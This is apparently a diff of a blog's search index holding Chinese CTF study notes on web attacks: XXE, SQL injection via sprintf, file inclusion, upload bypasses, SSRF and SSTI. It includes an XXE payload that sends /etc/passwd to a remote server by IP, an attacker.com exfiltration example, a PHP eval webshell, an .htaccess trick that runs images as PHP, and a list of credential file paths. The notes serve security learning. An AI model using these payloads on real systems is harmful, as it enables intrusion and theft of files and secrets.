-<h3 id="6-php地址引用"><a href="#6-php地址引用" class="headerlink" title="6.php地址引用:"></a>6.php地址引用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果需要一个值等于另一个的地址   ---&amp;$   ---&amp;取地址</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxe</title>
-    <url>/2025/06/02/ctfshow/xxe/</url>
-    <content><![CDATA[<h1 id="xxe的原理"><a href="#xxe的原理" class="headerlink" title="xxe的原理:"></a>xxe的原理:</h1><p>可以通过构造恶意 XML 数据，引入外部实体来实现：</p>
-<ul>
-<li>读取本地敏感文件（如 <code>/etc/passwd</code>）</li>
-<li>进行内网 SSRF</li>
-<li>拒绝服务（Billion Laughs）</li>
-<li>执行系统命令（少见，取决于 parser）</li>
-</ul>
-<h2 id="1-xxe的前提"><a href="#1-xxe的前提" class="headerlink" title="1.xxe的前提:"></a>1.xxe的前提:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);    --允许加载外部实体（XXE的前提）</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">---使用DOM解析XML，开启了实体替换（LIBXML_NOENT）和DTD加载（LIBXML_DTDLOAD），这正是XXE攻击生效的关键</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-常见的攻击方式"><a href="#2-常见的攻击方式" class="headerlink" title="2.常见的攻击方式:"></a>2.常见的攻击方式:</h2><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>描述</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>📁 本地文件读取</td>
-<td>读取敏感文件</td>
-<td><code>file:///etc/passwd</code></td>
-</tr>
-<tr>
-<td>🌐 SSRF</td>
-<td>访问内网资源</td>
-<td><code>http://127.0.0.1/admin</code></td>
-</tr>
-<tr>
-<td>💣 DoS</td>
-<td>百万笑攻击导致内存爆炸</td>
-<td><code>&lt;!ENTITY a &quot;&amp;a;&amp;a;&amp;a;&quot;&gt;</code></td>
-</tr>
-<tr>
-<td>📤 外带</td>
-<td>将数据发送到外部服务器</td>
-<td><code>http://attacker.com/?d=&amp;xxe;</code></td>
-</tr>
-<tr>
-<td>😈 Blind-XXE</td>
-<td>没有直接输出，通过回显外带</td>
-<td>配合 <code>&lt;!ENTITY xxe SYSTEM &quot;http://x.x.x.x:8080/?data=...&quot; &gt;</code></td>
-</tr>
-</tbody></table>
-<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><h2 id="1-直接"><a href="#1-直接" class="headerlink" title="1.直接:"></a>1.直接:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-数据外带"><a href="#2-数据外带" class="headerlink" title="2.数据外带:"></a>2.数据外带:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---这个位置可以换成php伪协议  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-一些绕过"><a href="#3-一些绕过" class="headerlink" title="3.一些绕过"></a>3.一些绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以对数据进行UTF-<span class="number">16</span>编码绕过(使用python)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>常用姿势</title>
-    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
-    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
-
-<hr>
-<hr>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
-
-<h1 id="linxu命令"><a href="#linxu命令" class="headerlink" title="linxu命令:"></a>linxu命令:</h1><h2 id="1-使用-可以分隔两个命令一起执行"><a href="#1-使用-可以分隔两个命令一起执行" class="headerlink" title="1.使用;可以分隔两个命令一起执行"></a>1.使用;可以分隔两个命令一起执行</h2>]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-通过伪协议"><a href="#1-通过伪协议" class="headerlink" title="1.通过伪协议"></a>1.通过伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="1-php-filter-使用方法"><a href="#1-php-filter-使用方法" class="headerlink" title="1.php:&#x2F;&#x2F;filter 使用方法"></a>1.php:&#x2F;&#x2F;filter 使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
-
-<h4 id="2-php-input-使用方法"><a href="#2-php-input-使用方法" class="headerlink" title="2.php:&#x2F;&#x2F;input 使用方法:"></a>2.php:&#x2F;&#x2F;input 使用方法:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-data-使用方法"><a href="#3-data-使用方法" class="headerlink" title="3.data:&#x2F;&#x2F;使用方法"></a>3.data:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-file-使用方法"><a href="#4-file-使用方法" class="headerlink" title="4.file:&#x2F;&#x2F;使用方法"></a>4.file:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="2-通过日志"><a href="#2-通过日志" class="headerlink" title="2.通过日志"></a>2.通过日志</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -2342,134 +1411,153 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-绕过内容里不能包含php"><a href="#2-绕过内容里不能包含php" class="headerlink" title="2.绕过内容里不能包含php:"></a>2.绕过内容里不能包含php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-增加文件头"><a href="#3-增加文件头" class="headerlink" title="3.增加文件头:"></a>3.增加文件头:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
-
-<table>
+    <title>ssrf</title>
+    <url>/2025/06/02/ctfshow/ssrf/</url>
+    <content><![CDATA[<h1 id="SSRF的运用原理"><a href="#SSRF的运用原理" class="headerlink" title="SSRF的运用原理:"></a>SSRF的运用原理:</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理:"></a>1.原理:</h2><p>利用存在漏洞的服务器，向内部或外部资源发送伪造的请求，从而达到以下目的：</p>
+<ul>
+<li>探测内网结构（端口扫描、服务发现）</li>
+<li>访问内网API（如云服务元数据接口）</li>
+<li>进行身份伪造（访问携带身份信息的资源）</li>
+<li>造成DoS、反弹请求等攻击</li>
+</ul>
+<h2 id="2-常用检测方法"><a href="#2-常用检测方法" class="headerlink" title="2.常用检测方法:"></a>2.常用检测方法:</h2><table>
 <thead>
 <tr>
-<th>文件类型</th>
-<th>魔术头（十六进制）</th>
-<th>魔术头（ASCII）</th>
-<th>示例用途</th>
+<th>检测类型</th>
+<th>方法</th>
+<th>描述</th>
+<th>检测是否成功的方式</th>
+<th>绕过思路</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>GIF89a</strong></td>
-<td><code>47 49 46 38 39 61</code></td>
-<td><code>GIF89a</code></td>
-<td>正规 GIF 图</td>
+<td>🌐 常见</td>
+<td><strong>访问内网地址</strong></td>
+<td>127.0.0.1、localhost、169.254.169.254、内网IP段等</td>
+<td>返回内容、响应时间差</td>
+<td>使用整数、16进制、<code>[::]</code>等变体绕过</td>
 </tr>
 <tr>
-<td><strong>GIF87a</strong></td>
-<td><code>47 49 46 38 37 61</code></td>
-<td><code>GIF87a</code></td>
-<td>老版本 GIF 图</td>
+<td>🌐 常见</td>
+<td><strong>DNSlog平台检测</strong></td>
+<td>传入外部 DNS 地址（如 <code>xx.ceye.io</code>）</td>
+<td>DNS平台记录到解析请求</td>
+<td>域名跳转、伪协议等规避安全策略</td>
 </tr>
 <tr>
-<td><strong>PNG</strong></td>
-<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
-<td><code>.PNG....</code></td>
-<td>PNG 图</td>
+<td>🌐 常见</td>
+<td><strong>HTTP外带检测</strong></td>
+<td>构造 URL 发起外部 HTTP 请求</td>
+<td>服务器访问日志、Burp Collaborator、tcpdump</td>
+<td>基于 SSRF 的跳转链</td>
 </tr>
 <tr>
-<td><strong>JPG</strong> &#x2F; JPEG</td>
-<td><code>FF D8 FF</code></td>
-<td>N&#x2F;A</td>
-<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
+<td>🌐 常见</td>
+<td><strong>文件协议</strong></td>
+<td>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 等</td>
+<td>如果读取内容返回，证明存在 SSRF</td>
+<td>file协议黑名单绕过、伪协议组合</td>
 </tr>
 <tr>
-<td><strong>PDF</strong></td>
-<td><code>25 50 44 46 2D</code></td>
-<td><code>%PDF-</code></td>
-<td>经典文档上传绕过</td>
+<td>🌐 常见</td>
+<td><strong>gopher协议检测</strong></td>
+<td>构造 Redis 注入 &#x2F; SSRF-RCE</td>
+<td>返回内容为空，但配合后端验证成功</td>
+<td>被多数防火墙限制，注意协议混淆</td>
 </tr>
 <tr>
-<td><strong>ZIP</strong></td>
-<td><code>50 4B 03 04</code></td>
-<td><code>PK..</code></td>
-<td>上传压缩包</td>
+<td>🌐 常见</td>
+<td><strong>请求延迟检测</strong></td>
+<td>访问 <code>http://10.0.0.1:81</code> 等，观察延迟</td>
+<td>请求阻塞 &#x2F; 超时 &#x2F; 响应慢</td>
+<td>用于端口扫描时做判断</td>
 </tr>
 <tr>
-<td><strong>RAR</strong></td>
-<td><code>52 61 72 21 1A 07 00</code></td>
-<td><code>Rar!...</code></td>
-<td>压缩文件</td>
+<td>⚠️ 不常见</td>
+<td><strong>请求头注入检测</strong></td>
+<td>伪造 <code>Host</code>, <code>X-Forwarded-Host</code>, <code>X-Real-IP</code> 等</td>
+<td>后端错误信息中暴露 Host 信息</td>
+<td>配合 Host header 漏洞打 SSRF</td>
 </tr>
 <tr>
-<td><strong>EXE</strong>（Windows）</td>
-<td><code>4D 5A</code></td>
-<td><code>MZ</code></td>
-<td>可执行文件</td>
+<td>⚠️ 不常见</td>
+<td><strong>Open Redirect 联动检测</strong></td>
+<td>先跳转再 SSRF</td>
+<td>可被 SSRF 利用的 OpenRedirect</td>
+<td>常规过滤难以识别 URL 跳转链</td>
 </tr>
 <tr>
-<td><strong>ELF</strong>（Linux）</td>
-<td><code>7F 45 4C 46</code></td>
-<td><code>.ELF</code></td>
-<td>Linux 二进制</td>
+<td>⚠️ 不常见</td>
+<td><strong>SVG 渲染触发 HTTP 请求</strong></td>
+<td>提交嵌入外链的 SVG，观察目标服务器是否发起请求</td>
+<td>需要精心构造图像并外带链接</td>
+<td>绕过非URL型白名单</td>
 </tr>
 <tr>
-<td><strong>MP3</strong></td>
-<td><code>49 44 33</code></td>
-<td><code>ID3</code></td>
-<td>音频文件头</td>
+<td>⚠️ 不常见</td>
+<td><strong>PDF生成功能 SSRF</strong></td>
+<td>提交带图像URL的 HTML，让服务器渲染 PDF 触发请求</td>
+<td>外部服务器或DNS记录</td>
+<td>PDF服务通常可执行外部请求</td>
 </tr>
 <tr>
-<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
-<td><code>50 4B 03 04</code></td>
-<td>ZIP！</td>
-<td>Office 新版其实是 ZIP 容器</td>
+<td>⚠️ 不常见</td>
+<td><strong>OAuth&#x2F;SSO 重定向利用</strong></td>
+<td>借助SSO第三方回调URL发起 SSRF</td>
+<td>需要结合OAuth实现细节</td>
+<td>重定向 + SSRF合击链</td>
 </tr>
 <tr>
-<td><strong>OLD DOC (97-2003)</strong></td>
-<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
-<td>N&#x2F;A</td>
-<td>老式 Office 文件</td>
+<td>⚠️ 不常见</td>
+<td><strong>SMTP SSRF</strong></td>
+<td><code>smtp://127.0.0.1:25</code> 向邮件服务注入请求</td>
+<td>邮件被发送、行为侧信道</td>
+<td>多协议SSRF + 内网钓鱼链</td>
 </tr>
 </tbody></table>
-<h3 id="4-远程包含"><a href="#4-远程包含" class="headerlink" title="4.远程包含:"></a>4.远程包含:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-通过jpg-gif-png二次渲染"><a href="#5-通过jpg-gif-png二次渲染" class="headerlink" title="5.通过jpg.gif.png二次渲染;"></a>5.通过jpg.gif.png二次渲染;</h3><h4 id="1-是否存在二次渲染"><a href="#1-是否存在二次渲染" class="headerlink" title="1.是否存在二次渲染:"></a>1.是否存在二次渲染:</h4><table>
+<h2 id="3-linxu常见敏感目录"><a href="#3-linxu常见敏感目录" class="headerlink" title="3.linxu常见敏感目录:"></a>3.linxu常见敏感目录:</h2><table>
 <thead>
 <tr>
-<th>条件</th>
-<th>说明</th>
-<th>判断方法</th>
+<th>路径</th>
+<th>含义</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>上传后图像被重新压缩</td>
-<td>MD5不一致</td>
-<td>上传后下载图片对比</td>
+<td><code>/etc/passwd</code></td>
+<td>用户信息（无密码）</td>
 </tr>
 <tr>
-<td>上传的 EXIF 信息被清除</td>
-<td>文件属性被抹掉</td>
-<td><code>exif_read_data()</code> 检查</td>
+<td><code>/etc/shadow</code></td>
+<td>加密密码（需root权限）</td>
 </tr>
 <tr>
-<td>伪代码失效</td>
-<td>木马内容被去掉</td>
-<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
+<td><code>/root/.ssh/id_rsa</code></td>
+<td>SSH私钥</td>
 </tr>
 <tr>
-<td>文件大小被大幅缩小</td>
-<td>说明被重新处理</td>
-<td>查看上传前后大小差距</td>
+<td><code>/var/www/html/config.php</code></td>
+<td>Web站点配置</td>
 </tr>
 <tr>
-<td>Webshell 不再执行</td>
-<td>二次渲染清除了恶意代码</td>
-<td>手动访问判断是否能执行PHP代码</td>
+<td><code>/proc/self/environ</code></td>
+<td>当前进程环境变量（可能泄漏Token）</td>
+</tr>
+<tr>
+<td><code>/proc/version</code></td>
+<td>内核版本信息</td>
 </tr>
 </tbody></table>
-<h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="4-对127-0-0-1的绕过"><a href="#4-对127-0-0-1的绕过" class="headerlink" title="4.对127.0.0.1的绕过:"></a>4.对127.0.0.1的绕过:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以把域名的解析改到<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">    就能成功解析</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-通过302重定向的方法跳转"><a href="#5-通过302重定向的方法跳转" class="headerlink" title="5.通过302重定向的方法跳转:"></a>5.通过302重定向的方法跳转:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="6-通过标准的url结构绕过"><a href="#6-通过标准的url结构绕过" class="headerlink" title="6.通过标准的url结构绕过:"></a>6.通过标准的url结构绕过:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scheme://username:password@host:port/path?query#fragment</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h1><h2 id="1-curl-exec函数"><a href="#1-curl-exec函数" class="headerlink" title="1.curl_exec函数:"></a>1.curl_exec函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_exec:把参数当作curl的参数传递</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -2480,557 +1568,748 @@
       </tags>
   </entry>
   <entry>
-    <title>linxu命令</title>
-    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="linux-常用命令"><a href="#linux-常用命令" class="headerlink" title="linux 常用命令"></a>linux 常用命令</h1><h3 id="1-新建虚拟环境"><a href="#1-新建虚拟环境" class="headerlink" title="1.新建虚拟环境"></a>1.新建虚拟环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入虚拟环境:   source venv/bin/activate</span><br><span class="line">启动一个 screen 会话：screen -S mysession</span><br><span class="line">以后可以用下面的命令重新连接会话： screen -r mysession</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-复制文件命令"><a href="#2-复制文件命令" class="headerlink" title="2.复制文件命令:"></a>2.复制文件命令:</h3><h4 id="1-cp命令"><a href="#1-cp命令" class="headerlink" title="1.cp命令:"></a>1.cp命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp [选项] 源文件 目标文件/目录</span><br></pre></td></tr></table></figure>
-
-<table>
+    <title>ssti</title>
+    <url>/2025/06/02/ctfshow/ssti/</url>
+    <content><![CDATA[<h1 id="常见检测"><a href="#常见检测" class="headerlink" title="常见检测:"></a>常见检测:</h1><table>
 <thead>
 <tr>
-<th>命令</th>
-<th>说明</th>
+<th>语言</th>
+<th>模板引擎</th>
+<th>示例 Payload</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>cp a.txt b.txt</code></td>
-<td>把 <code>a.txt</code> 复制成 <code>b.txt</code></td>
+<td>Python</td>
+<td>Jinja2</td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code> → 49</td>
 </tr>
 <tr>
-<td><code>cp a.txt /tmp/</code></td>
-<td>把 <code>a.txt</code> 复制到 <code>/tmp/</code> 目录</td>
+<td>Python</td>
+<td>Mako</td>
+<td><code>$&#123;7*7&#125;</code> → 49</td>
 </tr>
 <tr>
-<td><code>cp -r dir1 dir2</code></td>
-<td>递归复制目录（必须加 <code>-r</code>）</td>
+<td>PHP</td>
+<td>Smarty</td>
+<td><code>&#123;$smarty.version&#125;</code></td>
 </tr>
 <tr>
-<td><code>cp -f a b</code></td>
-<td>强制覆盖目标文件</td>
+<td>Java</td>
+<td>FreeMarker</td>
+<td><code>$&#123;7*7&#125;</code> → 49</td>
 </tr>
 <tr>
-<td><code>cp -u a b</code></td>
-<td>仅当源文件比目标新时才复制（常用于备份）</td>
+<td>Java</td>
+<td>Velocity</td>
+<td><code>#set($x=7*7) $x</code></td>
+</tr>
+<tr>
+<td>Node.js</td>
+<td>EJS</td>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
 </tr>
 </tbody></table>
-<h4 id="2-tee命令"><a href="#2-tee命令" class="headerlink" title="2.tee命令:"></a>2.tee命令:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | tee [选项] 文件名</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250527155737650.png" alt="image-20250527155737650"></p>
+<h1 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块:"></a>各个模块:</h1><h2 id="1-jinja2"><a href="#1-jinja2" class="headerlink" title="1.jinja2:"></a>1.jinja2:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br><span class="line">查看所有模块:</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<table>
-<thead>
-<tr>
-<th><strong>命令</strong></th>
-<th><strong>说明</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>cp a.txt b.txt</code></td>
